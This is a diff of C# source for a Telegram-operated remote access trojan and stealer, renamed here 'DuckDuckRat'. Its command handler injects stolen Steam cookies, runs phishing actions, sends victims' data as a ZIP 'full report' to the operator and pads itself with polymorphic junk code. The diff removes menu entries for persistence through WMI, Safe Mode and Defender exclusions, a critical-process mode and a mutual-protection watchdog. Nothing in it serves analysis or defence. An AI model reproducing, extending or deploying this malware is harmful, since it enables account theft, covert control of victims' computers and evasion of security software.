@@ -11,23 +11,23 @@ using Telegram.Bot.Types.ReplyMarkups;
 using TgMessage = Telegram.Bot.Types.Message;
 using System.Net;
 using System.Net.Http;
-using VanguardCore.Modules;
+using DuckDuckRat.Modules;
 using Microsoft.Data.Sqlite;
-using FinalBot;
+using DuckDuckRat;
 using Microsoft.UpdateService.Modules;
-using FinalBot.Stealers;
-using FinalBot.Modules;
-using VanguardCore;
+using DuckDuckRat.Stealers;
+using DuckDuckRat.Modules;
+using DuckDuckRat;
 using System.Linq;
 using File = System.IO.File;
 using System.Diagnostics;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     public class CommandHandler
     {
         // [POLY_JUNK]
-        private static void _vanguard_c368bb88() {
+        private static void _DuckDuckRat_c368bb88() {
             int val = 23223;
             if (val > 50000) Console.WriteLine("Hash:" + 23223);
         }
@@ -132,6 +132,19 @@ namespace FinalBot
                             
                         });
                         await _botClient.SendTextMessageAsync(_adminId, "🍪 <b>Обнаружен JSON файл.</b> Инжектировать как куки Steam?", parseMode: ParseMode.Html, replyMarkup: markup);
+                    }
+
+                    // [SENTINEL] Media ID Grabber for Aesthetic Customization
+                    if (message.From?.Id.ToString() == _adminId)
+                    {
+                        if (message.Animation != null)
+                        {
+                            await _botClient.SendTextMessageAsync(_adminId, $"📥 <b>Media ID:</b>\n<code>{message.Animation.FileId}</code>", parseMode: ParseMode.Html);
+                        }
+                        else if (message.Document != null && message.Document.FileName != null && message.Document.FileName.EndsWith(".gif"))
+                        {
+                            await _botClient.SendTextMessageAsync(_adminId, $"📦 <b>GIF ID:</b>\n<code>{message.Document.FileId}</code>", parseMode: ParseMode.Html);
+                        }
                     }
                 }
 
@@ -482,27 +495,6 @@ namespace FinalBot
                         await HandleWindowHistory(message.Chat.Id);
                         break;
                     
-                    case "harden_persistence":
-                        if (!await CheckTarget(callbackQuery.Id)) return;
-                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🛡️ Активация протокола Sentinel...");
-                        VanguardCore.SafetyManager.ApplyHardPersistence();
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>SENTINEL ACTIVE:</b> WMI + SafeMode + Defender exclusions applied.", parseMode: ParseMode.Html);
-                        break;
-                    
-                    case "critical_toggle":
-                        if (!await CheckTarget(callbackQuery.Id)) return;
-                        bool newState = !VanguardCore.ElevationService.IsCritical();
-                        VanguardCore.SafetyManager.SetCriticalMode(newState);
-                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"💀 Critical Mode: {(newState ? "ON" : "OFF")}");
-                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
-                        break;
-                    
-                    case "activate_guardian":
-                        if (!await CheckTarget(callbackQuery.Id)) return;
-                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "👁️ Протокол «Близнец» запущен...");
-                        FinalBot.Modules.TwinService.StartGuardian();
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>GUARDIAN TWIN ACTIVE:</b> Mutual process protection enabled.", parseMode: ParseMode.Html);
-                        break;
 
                     // Phishing Actions
                     case "work_vac_alert":
@@ -913,7 +905,7 @@ namespace FinalBot
 
                     using (var stream = new FileStream(newZipPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
-                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("📦 <b>Vanguard Full Report Locked</b>"), parseMode: ParseMode.Html);
+                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("📦 <b>DUCK DUCK RAT v1 Full Report Locked</b>"), parseMode: ParseMode.Html);
                     }
                     
                     // Delay cleanup to ensure file handles are released
@@ -1016,9 +1008,6 @@ namespace FinalBot
                     InlineKeyboardButton.WithCallbackData("📶 ПРОЦЕССЫ", "proc_list")
                 },
                 new[] { InlineKeyboardButton.WithCallbackData(ProxyModule.IsActive ? "🌐 ПРОКСИ 🟢" : "🌐 ПРОКСИ 🔴", "proxy_toggle") },
-                new[] { InlineKeyboardButton.WithCallbackData("🛡️ УСИЛИТЬ ЗАКРЕП", "harden_persistence") },
-                new[] { InlineKeyboardButton.WithCallbackData("💀 CRITICAL MODE", "critical_toggle") },
-                new[] { InlineKeyboardButton.WithCallbackData("👁️ АКТИВИРОВАТЬ СТРАЖА", "activate_guardian") },
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
@@ -1265,3 +1254,5 @@ namespace FinalBot
         }
     }
 }
+
+
